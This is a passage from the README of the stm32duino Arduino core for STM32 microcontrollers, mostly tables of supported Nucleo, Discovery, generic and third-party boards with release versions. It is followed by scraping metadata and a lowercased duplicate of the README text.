P-Nucleo-WB55RG 1.6.0 BLE support with STM32duinoBLE\n\ud83d\udc9a STM32WL55JC Nucleo WL55JC1 2.1.0 LoRa support not available\nNucleo 32 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F031K6T Nucleo F031K6 1.9.0\n\ud83d\udc9a STM32F042K6T Nucleo F042K6 2.1.0\n\ud83d\udc9a STM32F303K8 Nucleo F303K8 1.1.0\n\ud83d\udc9a STM32G031K8 Nucleo G031K8 2.0.0\n\ud83d\udc9a STM32G431KB Nucleo G431KB 1.7.0\n\ud83d\udc9a STM32L031K6 Nucleo L031K6 1.1.1\n\ud83d\udc9a STM32L412KB Nucleo L412KB 1.5.0\n\ud83d\udc9a STM32L432KC Nucleo L432KC 0.2.0\nDiscovery boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F030R8 32F0308DISCOVERY 1.3.0\n\ud83d\udc9a STM32F072RB 32F072BDISCOVERY 1.5.0\n\ud83d\udc9a STM32F100RB STM32VLDISCOVERY 0.2.1\n\ud83d\udc9a STM32F303VC STM32F3DISCOVERY 2.0.0\n\ud83d\udc9a STM32F407VG STM32F407G-DISC1 0.1.0\n\ud83d\udc9a STM32F413ZH 32F413HDISCOVERY 1.9.0\n\ud83d\udc9a STM32F746NG STM32F746G-DISCOVERY 0.1.0\n\ud83d\udc9a STM32G031J6 STM32G0316-DISCO 1.9.0\n\ud83d\udc9a STM32G431CB B-G431B-ESC1 2.0.0\n\ud83d\udc9a STM32L4S5VI B-L4S5I-IOT01A 2.0.0\n\ud83d\udc9a STM32U585AIIxQ B-U585I-IOT02A 2.1.0\n\ud83d\udc9a STM32WB5MMG STM32WB5MM-DK 2.1.0\nEval boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32L4R9ZI STEVAL-MKSBOX1V1 (SensorTile.box) 1.7.0\nSTM32MP1 series coprocessor boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32MP157A STM32MP157A-DK1 1.8.0 See the documentation to use this board\n\ud83d\udc9a STM32MP157C STM32MP157C-DK2 1.8.0 See the documentation to use this board\nGeneric STM32F0 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F030F4 STM32F030F4 Demo board 1.5.0\n\ud83d\udc9a STM32F030C8 Generic Board 2.0.0\n\ud83d\udc9a STM32F030F4 Generic Board 2.0.0\n\ud83d\udc9a STM32F030R8 Generic Board 2.0.0\n\ud83d\udc9a STM32F031K6T Generic Board 2.0.0\n\ud83d\udc9a STM32F042C4\nSTM32F042C6 Generic Board 2.0.0\n\ud83d\udc9a STM32F042K4T\nSTM32F042K6T Generic Board 2.0.1\n\ud83d\udc9a STM32F051K6U\nSTM32F051K8U Generic Board 2.0.0\n\ud83d\udc9a STM32F070CB Generic Board 2.0.0\n\ud83d\udc9a STM32F070RB Generic Board 2.0.0\n\ud83d\udc9a STM32F072C8\nSTM32F072CB Generic Board 2.0.0\n\ud83d\udc9a STM32F072R8\nSTM32F072RB Generic Board 2.0.0\n\ud83d\udc9a STM32F091RB\nSTM32F091RC Generic Board 2.0.0\nGeneric STM32F1 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F100C4\nSTM32F100C6 Generic Board 2.0.0\n\ud83d\udc9a STM32F100C8\nSTM32F100CB Generic Board 2.0.0\n\ud83d\udc9a STM32F103C6\nSTM32F103C8\nSTM32F103CB Blue Pill 1.2.0 USB CDC support since 1.5.0\nMaple bootloaders support since 1.6.0\n\ud83d\udc9a STM32F103C8\nSTM32F103CB Black Pill 1.5.0\n\ud83d\udc9a STM32F103C4\nSTM32F103C6\nSTM32F103C8\nSTM32F103CB Generic Board 1.9.0\n\ud83d\udc9a STM32F103R8\nSTM32F103RB\nSTM32F103RC\nSTM32F103RE Blue Button F103Rx 1.9.0\n\ud83d\udc9a STM32F103R6\nSTM32F103R8\nSTM32F103RB\nSTM32F103RC\nSTM32F103RD\nSTM32F103RE\nSTM32F103RF\nSTM32F103RG Generic Board 1.9.0\n\ud83d\udc9a STM32F103T4\nSTM32F103T6\nSTM32F103T8\nSTM32F103TB Generic Board 1.9.0\n\ud83d\udc9a STM32F103V8\nSTM32F103VB\nSTM32F103VC\nSTM32F103VD\nSTM32F103VE\nSTM32F103VF\nSTM32F103VG Generic Board 1.9.0\n\ud83d\udc9a STM32F103ZC\nSTM32F103ZD\nSTM32F103ZE\nSTM32F103ZF\nSTM32F103ZG Generic Board 1.9.0\n\ud83d\udc9a STM32F103TB HY-TinySTM103T 1.5.0 More info\n\ud83d\udc9a STM32F103CB Maple Mini 1.2.0 More info\nUSB CDC support since 1.5.0\nMaple bootloaders support since 1.6.0\n\ud83d\udc9a STM32F103ZE vcc-gnd.com 1.9.0 More info\n\ud83d\udc9a STM32F103ZE vcc-gnd.com Mini 1.9.0 More info\nGeneric STM32F2 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F207ZC\nSTM32F207ZE\nSTM32F207ZF\nSTM32F207G Generic Board 2.0.0\n\ud83d\udc9a STM32F217ZE\nSTM32F217G Generic Board 2.0.0\nGeneric STM32F3 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F302R6\nSTM32F302R8 Generic Board 2.0.0\n\ud83d\udc9a STM32F303CB\nSTM32F303CC Generic Board 2.0.0\n\ud83d\udc9a STM32F303CC RobotDyn Black Pill 1.6.1 More info\n\ud83d\udc9a STM32F303K6\nSTM32F303K8 Generic Board 2.0.0\n\ud83d\udc9a STM32F303RD\nSTM32F303RE Generic Board 2.0.0\n\ud83d\udc9a STM32F303RB\nSTM32F303RC Generic Board 2.0.0\n\ud83d\udc9a STM32F303RC OLIMEXINO-STM32F3 2.0.0\n\ud83d\udc9a STM32F303VBT\nSTM32F303VCT Generic Board 2.0.0\n\ud83d\udc9a STM32F334K4\nSTM32F334K6\nSTM32F334K8 Generic Board 2.0.0\nGeneric STM32F4 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F405RG Adafruit Feather STM32F405 Express 1.8.0\n\ud83d\udc9a STM32F401CC WeAct Black Pill 1.7.0 More info\n\ud83d\udc9a STM32F411CE WeAct Black Pill 1.9.0 More info\n\ud83d\udc9a STM32F407VE\nSTM32F407VG STM32 F4VE / Black F407VET6 1.4.0 STM32F407VG support since 1.5.0\n\ud83d\udc9a STM32F407ZE\nSTM32F407ZG Black F407ZE / Black F407ZG 1.5.0\n\ud83d\udc9a STM32F407ZG vcc-gnd.com Mini 2.0.0 More info\n\ud83d\udc9a STM32F407VE vcc-gnd.com Mini 1.4.0 More info\n\ud83d\udc9a STM32F401RC STM32F Core Board 1.7.0\n\ud83d\udc9a STM32F407VG DIYMORE STM32F407VGT 1.5.0\n\ud83d\udc9a STM32F407VE FK407M1 1.5.0\n\ud83d\udc9a STM32F401CB\nSTM32F401CC\nSTM32F401CD\nSTM32F401CE Generic Board 1.9.0\n\ud83d\udc9a STM32F401RB\nSTM32F401RC\nSTM32F401RD\nSTM32F401RE Generic Board 1.8.0\n\ud83d\udc9a STM32F401VB\nSTM32F401VC\nSTM32F401VD\nSTM32F401VE Generic Board 2.0.0\n\ud83d\udc9a STM32F405RG Generic Board 1.9.0\n\ud83d\udc9a STM32F407VE\nSTM32F407VG Generic Board 1.9.0\n\ud83d\udc9a STM32F407ZE\nSTM32F407ZG Generic Board 2.0.0\n\ud83d\udc9a STM32F410C8\nSTM32F410CB Generic Board 1.9.0\n\ud83d\udc9a STM32F410R8\nSTM32F410RB Generic Board 1.9.0\n\ud83d\udc9a STM32F411CC\nSTM32F411CE Generic Board 1.9.0\n\ud83d\udc9a STM32F411RC\nSTM32F411RE Generic Board 1.9.0\n\ud83d\udc9a STM32F412CE\nSTM32F412CG Generic Board 1.9.0\n\ud83d\udc9a STM32F412RE\nSTM32F412RG Generic Board 1.9.0\n\ud83d\udc9a STM32F413CG\nSTM32F413CH Generic Board 1.9.0\n\ud83d\udc9a STM32F413RG\nSTM32F413RH Generic Board 1.9.0\n\ud83d\udc9a STM32F413ZG\nSTM32F413ZH Generic Board 2.0.0\n\ud83d\udc9a STM32F415RG Generic Board 1.9.0\n\ud83d\udc9a STM32F417VE\nSTM32F417VG Generic Board 1.9.0\n\ud83d\udc9a STM32F417ZE\nSTM32F417ZG Generic Board 2.0.0\n\ud83d\udc9a STM32F423CH Generic Board 1.9.0\n\ud83d\udc9a STM32F423RH Generic Board 1.9.0\n\ud83d\udc9a STM32F423ZH Generic Board 2.0.0\n\ud83d\udc9a STM32F427ZG\nSTM32F427ZI Generic Board 2.0.0\n\ud83d\udc9a STM32F429ZE\nSTM32F429ZG\nSTM32F429ZI Generic Board 2.0.0\n\ud83d\udc9a STM32F437ZG\nSTM32F437ZI Generic Board 2.0.0\n\ud83d\udc9a STM32F439ZG\nSTM32F439ZI Generic Board 2.0.0\n\ud83d\udc9a STM32F446RC\nSTM32F446RE Generic Board 1.9.0\n\ud83d\udc9a STM32F446VC\nSTM32F446VE Generic Board 2.0.0\n\ud83d\udc9a STM32F411CE ThunderPack v1.1+ 1.9.0\nGeneric STM32F7 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F745ZE\nSTM32F745ZG Generic Board 2.0.0\n\ud83d\udc9a STM32F746BE\nSTM32F746BG\nSTM32F746NE\nSTM32F746NG Generic Board 2.0.0\n\ud83d\udc9a STM32F746ZE\nSTM32F746ZG Generic Board 2.0.0\n\ud83d\udc9a STM32F750N8 Generic Board 2.0.0\n\ud83d\udc9a STM32F750Z8 Generic Board 2.0.0\n\ud83d\udc9a STM32F756BG\nSTM32F756NG Generic Board 2.0.0\n\ud83d\udc9a STM32F756ZG Generic Board 2.0.0\n\ud83d\udc9a STM32F765VG\nSTM32F765VI Generic Board 2.0.0\n\ud83d\udc9a STM32F765ZG\nSTM32F765ZI Generic Board 2.0.0\n\ud83d\udc9a STM32F767VG\nSTM32F767VI Generic Board 2.0.0\n\ud83d\udc9a STM32F767ZG\nSTM32F767ZI Generic Board 2.0.0\n\ud83d\udc9a STM32F777VI Generic Board 2.0.0\n\ud83d\udc9a STM32F777ZI Generic Board 2.0.0\nGeneric STM32G0 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9b STM32G030C6\nSTM32G030C8 Generic Board 2.2.0\n\ud83d\udc9b STM32G030F6\nSTM32G030F6 Generic Board 2.2.0\n\ud83d\udc9a STM32G030K8 Aurora One 2.0.0\n\ud83d\udc9a STM32G030K6\nSTM32G030K8 Generic Board 2.0.0\n\ud83d\udc9a STM32G031J4\nSTM32G031J6 Generic Board 2.0.0\n\ud83d\udc9a STM32G031K4\nSTM32G031K6\nSTM32G031K8 Generic Board 2.0.0\n\ud83d\udc9a STM32G041J6 Generic Board 2.0.0\n\ud83d\udc9a STM32G041K6\nSTM32G041K8 Generic Board 2.0.0\n\ud83d\udc9a STM32G071R6\nSTM32G071R8\nSTM32G071RB Generic Board 2.0.0\n\ud83d\udc9a STM32G081RB Generic Board 2.0.0\n\ud83d\udc9a STM32G0B1RB\nSTM32G0B1RC\nSTM32G0B1RE Generic Board 2.1.0\n\ud83d\udc9a STM32G0C1RB\nSTM32G0C1RE Generic Board 2.1.0\nGeneric STM32G4 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32G431C6U\nSTM32G431C8U\nSTM32G431CBU Generic Board 2.0.0\n\ud83d\udc9a STM32G441CBU Generic Board 2.0.0\n\ud83d\udc9a STM32G431K6\nSTM32G431K8\nSTM32G431KB Generic Board 2.0.0\n\ud83d\udc9a STM32G441KB Generic Board 2.0.0\n\ud83d\udc9a STM32G431R6\nSTM32G431R8\nSTM32G431RB Generic Board 2.0.0\n\ud83d\udc9a STM32G441RB Generic Board 2.0.0\n\ud83d\udc9a STM32G473RB\nSTM32G473RC\nSTM32G473RE Generic Board 2.0.0\n\ud83d\udc9a STM32G474RB\nSTM32G474RC\nSTM32G474RE Generic Board 2.0.0\n\ud83d\udc9a STM32G483RE Generic Board 2.0.0\n\ud83d\udc9a STM32G484RE Generic Board 2.0.0\nGeneric STM32H7 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32H742IG\nSTM32H742II Generic Board 2.1.0\n\ud83d\udc9a STM32H742VG\nSTM32H742VI Generic Board 2.0.0\n\ud83d\udc9a STM32H742ZG\nSTM32H742ZI Generic Board 2.0.0\n\ud83d\udc9a STM32H743IG\nSTM32H743II Generic Board 2.0.0\n\ud83d\udc9a STM32H743VG\nSTM32H743VI Generic Board 2.0.0\n\ud83d\udc9b STM32H743VI DevEBox H743VIT6 2.2.0\n\ud83d\udc9b STM32H743VI WeAct MiniSTM32H743VIT6 2.2.0 More info\n\ud83d\udc9a STM32H743ZG\nSTM32H743ZI Generic Board 2.0.0\n\ud83d\udc9a STM32H747AG\nSTM32H747AI Generic Board 2.0.0\n\ud83d\udc9a STM32H747IG\nSTM32H747II Generic Board 2.0.0\n\ud83d\udc9a STM32H750ZB Generic Board 2.0.0\n\ud83d\udc9a STM32H750IB\nSTM32H750II Generic Board 2.0.0\n\ud83d\udc9a STM32H750IB Daisy 1.9.0\n\ud83d\udc9b STM32H750IB Daisy Patch SM 2.2.0\n\ud83d\udc9b STM32H750IB Daisy Petal SM 2.2.0\n\ud83d\udc9a STM32H750VB Generic Board 2.0.0\n\ud83d\udc9b STM32H750VB DevEBox H750VBT6 2.2.0\n\ud83d\udc9b STM32H750VB WeAct MiniSTM32H750VBT6 2.2.0 More info\n\ud83d\udc9a STM32H753VI Generic Board 2.0.0\n\ud83d\udc9a STM32H753ZI Generic Board 2.0.0\n\ud83d\udc9a STM32H757AI Generic Board 2.0.0\n\ud83d\udc9a STM32H757II Generic Board 2.0.0\nGeneric STM32L0 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32L010RB Generic Board 2.0.0\n\ud83d\udc9a STM32L031K4T\nSTM32L031K6T Generic Board 2.0.0\n\ud83d\udc9a STM32L041K6T Generic Board 2.0.0\n\ud83d\udc9a STM32L051C6\nSTM32L051C8 Generic Board 2.0.0\n\ud83d\udc9a STM32L052R6T\nSTM32L052R8T Generic Board 2.0.0\n\ud83d\udc9a STM32L053R6T\nSTM32L053R8T Generic Board 2.0.0\n\ud83d\udc9a STM32L063R8T Generic Board 2.0.0\n\ud83d\udc9a STM32L072CBY\nSTM32L072CZE\nSTM32L072CZY Generic Board 2.0.0\n\ud83d\udc9a STM32L072KBT\nSTM32L072KZT Generic Board 2.0.0\n\ud83d\udc9a STM32L072KZT ThunderPack v1.0 1.8.0\n\ud83d\udc9a STM32L072RBT PX-HER0 1.8.0\n\ud83d\udc9a STM32L072RBT\nSTM32L072RZT Generic Board 2.0.0\n\ud83d\udc9a STM32L073CZY Generic Board 2.0.0\n\ud83d\udc9a STM32L073RBT\nSTM32L073RZT Generic Board 2.0.0\n\ud83d\udc9a STM32L082CZY Generic Board 2.0.0\n\ud83d\udc9a STM32L082KBT\nSTM32L082KZT Generic Board 2.0.0\n\ud83d\udc9a STM32L083RBT\nSTM32L083RZT Generic Board 2.0.0\nGeneric STM32L1 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32L100C6\nSTM32L100C6-A Generic Board 2.0.0\n\ud83d\udc9a STM32L151C6\nSTM32L151C8\nSTM32L151CB Generic Board 2.0.0\n\ud83d\udc9a STM32L151C6-A\nSTM32L151C8-A\nSTM32L151CB-A Generic Board 2.0.0\n\ud83d\udc9a STM32L152C6\nSTM32L152C8\nSTM32L152CB Generic Board 2.0.0\n\ud83d\udc9a STM32L152C6-A\nSTM32L152C8-A\nSTM32L152CB-A Generic Board 2.0.0\n\ud83d\udc9a STM32L151RE Generic Board 2.0.0\n\ud83d\udc9a STM32L152RE Generic Board 2.0.0\n\ud83d\udc9a STM32L162RE Generic Board 2.0.0\nGeneric STM32L4 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32L412K8\nSTM32L412KB\nSTM32L422KB Generic Board 2.0.0\n\ud83d\udc9a STM32L432KB\nSTM32L432KC\nSTM32L442KC Generic Board 2.0.0\n\ud83d\udc9a STM32L433CBT\nSTM32L433CCT Generic Board 2.1.0\n\ud83d\udc9a STM32L433CBU\nSTM32L433CCU Generic Board 2.1.0\n\ud83d\udc9a STM32L443CC\nSTM32L443CC Generic Board 2.1.0\n\ud83d\udc9a STM32L433RC-P Generic Board 2.0.0\n\ud83d\udc9a STM32L452RC\nSTM32L452RE\nSTM32L462RE Generic Board 2.0.0\n\ud83d\udc9a STM32L452RE-P Generic Board 2.0.0\n\ud83d\udc9a STM32L475VC\nSTM32L475VE\nSTM32L475VG Generic Board 2.0.0\n\ud83d\udc9a STM32L476VC\nSTM32L476VE\nSTM32L476VG Generic Board 2.0.0\n\ud83d\udc9a STM32L476RC\nSTM32L476RE\nSTM32L476RG Generic Board 2.0.0\n\ud83d\udc9a STM32L486VG Generic Board 2.0.0\n\ud83d\udc9a STM32L496ZE\nSTM32L496ZG Generic Board 2.0.0\n\ud83d\udc9a STM32L496ZG-P Generic Board 2.0.0\n\ud83d\udc9a STM32L4A6ZG Generic Board 2.0.0\n\ud83d\udc9a STM32L4A6ZG-P Generic Board 2.0.0\n\ud83d\udc9a STM32L4R5VG\nSTM32L4R5VI Generic Board 2.0.0\n\ud83d\udc9a STM32L4R5ZGTx\nSTM32L4R5ZITx Generic Board 2.0.0\n\ud83d\udc9a STM32L4R5ZGYx\nSTM32L4R5ZIYx Generic Board 2.1.0\n\ud83d\udc9a STM32L4R5ZI-P Generic Board 2.0.0\n\ud83d\udc9a STM32L4R7VITx Generic Board 2.0.0\n\ud83d\udc9a STM32L4R7ZITx Generic Board 2.0.0\n\ud83d\udc9a STM32L4R9ZGJx\nSTM32L4R9ZIJx Generic Board 2.0.0\n\ud83d\udc9a STM32L4R9ZGYx\nSTM32L4R9ZIYx Generic Board 2.1.0\n\ud83d\udc9a STM32L4S5VI Generic Board 2.0.0\n\ud83d\udc9a STM32L4S5ZITx Generic Board 2.0.0\n\ud83d\udc9a STM32L4S5ZIYx Generic Board 2.1.0\n\ud83d\udc9a STM32L4S7VI Generic Board 2.0.0\n\ud83d\udc9a STM32L4S7ZITx Generic Board 2.0.0\n\ud83d\udc9a STM32L4S9ZIJx Generic Board 2.0.0\n\ud83d\udc9a STM32L4S9ZIYx Generic Board 2.1.0\nGeneric STM32L5 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32L552ZC-Q\nSTM32L552ZE-Q Generic Board 2.0.0\n\ud83d\udc9a STM32L562ZE-Q Generic Board 2.0.0\nGeneric STM32U5 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32U575AGIxQ\nSTM32U575AIIxQ\nSTM32U585AIIxQ Generic Board 2.1.0\n\ud83d\udc9a STM32U575ZGTxQ\nSTM32U575ZITxQ\nSTM32U585ZETxQ Generic Board 2.1.0\nGeneric STM32WB boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32WB55CC\nSTM32WB55CE\nSTM32WB55CG Generic Board 2.0.0\n\ud83d\udc9a STM32WB5MMG Generic Board 2.1.0\n\ud83d\udc9a STM32WB55RC\nSTM32WB55RE\nSTM32WB55RG Generic Board 2.0.0\nGeneric STM32WL boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32WL55CC Generic Node Sensor Edition (GNSE) by TTI 2.1.0 GNSE GitHub\n\ud83d\udc9a STM32WL54CC\nSTM32WL55CC Generic Board 2.1.0\n\ud83d\udc9a STM32WL55JC\nSTM32WL55JC Generic Board 2.1.0\n\ud83d\udc9a STM32WLE4C8\nSTM32WLE4CB\nSTM32WLE4CC Generic Board 2.1.0\n\ud83d\udc9a STM32WLE4J8\nSTM32WLE4JB\nSTM32WLE4JC Generic Board 2.1.0\n\ud83d\udc9a STM32WLE5C8\nSTM32WLE5CB\nSTM32WLE5CC Generic Board 2.1.0\n\ud83d\udc9a STM32WLE5J8\nSTM32WLE5JB\nSTM32WLE5JC Generic Board 2.1.0\n3D printer boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F407VE ARMED V1 1.5.0\n\ud83d\udc9a STM32F030 EExtruder F030 V1 1.5.0 Small companion board for Prntr Board V1\n\ud83d\udc9a STM32F103C8 Malyan M200 V1 1.5.0\n\ud83d\udc9a STM32F070C8 Malyan M200 V2 1.5.0\n\ud83d\udc9a STM32F070C8 Malyan M300 1.8.0\n\ud83d\udc9a STM32F407VE Prntr Board V1 1.5.0\n\ud83d\udc9a STM32F407VE Prntr Board V2 1.8.0\n\ud83d\udc9a STM32F765VI RemRam v1 1.4.0\n\ud83d\udc9a STM32F446VE RUMBA32 1.5.0\n\ud83d\udc9a STM32F401VE STEVAL-3DP001V1 1.6.0\n\ud83d\udc9a STM32F446RE VAkE v1.0 1.6.0\n\ud83d\udc9a STM32F446VE FYSETC_S6 1.9.0\nBlues Wireless boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32L4R5ZIYx Swan R5 2.1.0\nElecgator boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F746ZET EtherCATduino 2.1.0\nElectronic Speed Controller boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F051K6U Wraith V1 ESC 1.8.0\n\ud83d\udc9a STM32F103RCT STorM32 V1.31 RC 2.1.0\nGaratronic/McHobby boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F072RB PYBStick 26 Duino 1.9.0 More info\n\ud83d\udc9a STM32F401CE PYBStick 26 Lite 1.9.0 More info\n\ud83d\udc9a STM32F411RE PYBStick 26 Standard 1.9.0 More info\n\ud83d\udc9a STM32F412RE PYBStick 26 Pro 1.9.0 More info\nGeneric flight controllers\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F103CB Afro Flight Rev5 (8/12MHz) 1.7.0\n\ud83d\udc9a STM32F303CC Sparky V1 1.6.0\nLoRa boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F072C8\nSTM32F072CB Elektor LoRa Node 1.8.0 More info\n\ud83d\udc9a STM32L151CB RAK811 LoRa Tracker 1.4.0 Wiki\n\ud83d\udc9a STM32L051C8 RHF76-052 1.7.0 Basic support\nMidatronics boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32WB55CE SharkyMKR 1.7.0\nNext release\nSee milestones to have an overview of the next release content.\nTroubleshooting\nFor question, support, ..., you could submit a topic on the stm32duino forum.\nIf you have any issue, you could file an issue on GitHub.\nIn any case, it always fine to search if your issue was not already existing before submit a new one.", "link": "https://github.com/stm32duino/Arduino_Core_STM32", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino core support for stm32 based boards\nintroduction\ngetting started\nsupported boards\ntroubleshooting\nwiki\nintroduction\nthis repo adds the support of stm32 mcu in arduino ide.\nthis porting is based on:\nstm32cube mcu packages including:\nthe hal hardware abstraction layer, enabling portability between different stm32 devices via standardized api calls\nthe low-layer (ll) apis, a light-weight, optimized, expert oriented set of apis designed for both performance and runtime efficiency\ncmsis device definition for stm32\ncmsis: cortex microcontroller software interface standard (cmsis) is a vendor-independent hardware abstraction layer for the cortex\u00ae-m processor series and defines generic -----> tool !!!  interfaces. it has been packaged as a module for arduino ide: https://github.com/stm32duino/arduinomodule-cmsis\ngnu arm embedded toolchain: arm embedded gcc compiler, libraries and other gnu tools necessary for bare-metal software development on devices based on the arm cortex-m. packages are provided thanks the xpack gnu arm embedded gcc: https://github.com/xpack-dev-tools/arm-none-eabi-gcc-xpack\ngetting started\nthis repo is available as a package usable with arduino boards manager.\nadd this link in the \"additional boards managers urls\" field:\nhttps://github.com/stm32duino/boardmanagerfiles/raw/main/package_stmicroelectronics_index.json\nwarning:\ndefault branch has changed to main.\nsince core release 2.0.0 this link has changed.\nfor full instructions on using the \"boards manager\", see the getting started page.\nadvanced user can use the repository to benefit from the latest development. see the using git repository page.\nuser can add a stm32 based board following this wiki.\nsupported boards\nnucleo 144 boards\nnucleo 64 boards\nnucleo 32 boards\ndiscovery boards\neval boards\nstm32mp1 series coprocessor boards\ngeneric stm32f0 boards\ngeneric stm32f1 boards\ngeneric stm32f2 boards\ngeneric stm32f3 boards\ngeneric stm32f4 boards\ngeneric stm32f7 boards\ngeneric stm32g0 boards\ngeneric stm32g4 boards\ngeneric stm32h7 boards\ngeneric stm32l0 boards\ngeneric stm32l1 boards\ngeneric stm32l4 boards\ngeneric stm32l5 boards\ngeneric stm32u5 boards\ngeneric stm32wb boards\ngeneric stm32wl boards\n3d printer boards\nblues wireless boards\nelecgator boards\nelectronic speed controller boards\ngaratronics boards\ngeneric flight controllers\nlora boards\nmidatronics boards\nnucleo 144 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f207zg nucleo f207zg 0.2.0\n\ud83d\udc9a stm32f429zi nucleo f429zi 0.1.0\n\ud83d\udc9a stm32f767zi nucleo f767zi 1.4.0\n\ud83d\udc9a stm32f746zg nucleo f746zg 1.9.0\n\ud83d\udc9a stm32f756zg nucleo f756zg 1.9.0\n\ud83d\udc9a stm32l496zg nucleo l496zg 1.3.0\n\ud83d\udc9a stm32l496zg-p nucleo l496zg-p 1.3.0\n\ud83d\udc9a stm32l4r5zi nucleo l4r5zi 1.4.0\n\ud83d\udc9a stm32l4r5zi-p nucleo l4r5zi-p 1.4.0\n\ud83d\udc9a stm32l552ze-q nucleo l552ze-q 2.0.0\n\ud83d\udc9a stm32h743zi nucleo h743zi(2) 1.5.0 nucleo h743zi2 since 1.6.0\n\ud83d\udc9a stm32u575zi-q nucleo-u575zi-q 2.1.0\nnucleo 64 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f030r8 nucleo f030r8 0.2.0\n\ud83d\udc9a stm32f070rb nucleo f070rb 2.0.0\n\ud83d\udc9a stm32f072rb nucleo f072rb 1.9.0\n\ud83d\udc9a stm32f091rc nucleo f091rc 0.1.0\n\ud83d\udc9a stm32f103rb nucleo f103rb 0.2.0\n\ud83d\udc9a stm32f302r8 nucleo f302r8 1.1.0\n\ud83d\udc9a stm32f303re nucleo f303re 0.1.0\n\ud83d\udc9a stm32f401re nucleo f401re 0.2.1\n\ud83d\udc9a stm32f411re nucleo f411re 0.2.1\n\ud83d\udc9a stm32f446re nucleo f446re 1.1.1\n\ud83d\udc9a stm32g071rb nucleo g071rb 1.6.0\n\ud83d\udc9a stm32g0b1re nucleo g0b1re 2.1.0\n\ud83d\udc9a stm32g431rb nucleo g431rb 1.7.0\n\ud83d\udc9a stm32g474re nucleo g474re 1.7.0\n\ud83d\udc9a stm32l010rb nucleo l010rb 2.1.0\n\ud83d\udc9a stm32l053r8 nucleo l053r8 0.1.0\n\ud83d\udc9a stm32l073rz nucleo l073rz 1.4.0\n\ud83d\udc9a stm32l152re nucleo l152re 1.0.0\n\ud83d\udc9a stm32l433rc-p nucleo l433rc-p 1.9.0\n\ud83d\udc9a stm32l452re nucleo l452re 1.5.0\n\ud83d\udc9a stm32l452re-p nucleo l452re-p 1.8.0\n\ud83d\udc9a stm32l476rg nucleo l476rg 0.1.0\n\ud83d\udc9a stm32wb55rg\nstm32wb55cg p-nucleo-wb55rg 1.6.0 ble support with stm32duinoble\n\ud83d\udc9a stm32wl55jc nucleo wl55jc1 2.1.0 lora support not available\nnucleo 32 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f031k6t nucleo f031k6 1.9.0\n\ud83d\udc9a stm32f042k6t nucleo f042k6 2.1.0\n\ud83d\udc9a stm32f303k8 nucleo f303k8 1.1.0\n\ud83d\udc9a stm32g031k8 nucleo g031k8 2.0.0\n\ud83d\udc9a stm32g431kb nucleo g431kb 1.7.0\n\ud83d\udc9a stm32l031k6 nucleo l031k6 1.1.1\n\ud83d\udc9a stm32l412kb nucleo l412kb 1.5.0\n\ud83d\udc9a stm32l432kc nucleo l432kc 0.2.0\ndiscovery boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f030r8 32f0308discovery 1.3.0\n\ud83d\udc9a stm32f072rb 32f072bdiscovery 1.5.0\n\ud83d\udc9a stm32f100rb stm32vldiscovery 0.2.1\n\ud83d\udc9a stm32f303vc stm32f3discovery 2.0.0\n\ud83d\udc9a stm32f407vg stm32f407g-disc1 0.1.0\n\ud83d\udc9a stm32f413zh 32f413hdiscovery 1.9.0\n\ud83d\udc9a stm32f746ng stm32f746g-discovery 0.1.0\n\ud83d\udc9a stm32g031j6 stm32g0316-disco 1.9.0\n\ud83d\udc9a stm32g431cb b-g431b-esc1 2.0.0\n\ud83d\udc9a stm32l4s5vi b-l4s5i-iot01a 2.0.0\n\ud83d\udc9a stm32u585aiixq b-u585i-iot02a 2.1.0\n\ud83d\udc9a stm32wb5mmg stm32wb5mm-dk 2.1.0\neval boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32l4r9zi steval-mksbox1v1 (sensortile.box) 1.7.0\nstm32mp1 series coprocessor boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32mp157a stm32mp157a-dk1 1.8.0 see the documentation to use this board\n\ud83d\udc9a stm32mp157c stm32mp157c-dk2 1.8.0 see the documentation to use this board\ngeneric stm32f0 boards\nstatus device(s) name release notes\n\ud83d\udc9a stm32f030f4 stm32f030f4 demo board 1.5.0\n\ud83d\udc9a stm32f030c8 generic board 2.0.0\n\ud83d\udc9a stm32f030f4 generic board 2.0.0\n\ud83d\udc9a stm32f030r8 generic board 2.0.0\n\ud83d\udc9a stm32f031k6t generic board 2.0.0\n\ud83d\udc9a stm32f042c4\nstm32f042c6 generic board 2.0.0\n\ud83d\udc9a stm32f042k4t\nstm32f042k6t generic board 2.0.1\n\ud83d\udc9a stm32f051k6u\nstm32f051k8u generic board 2.0.0\n\ud83d\udc9a stm32f070cb generic board 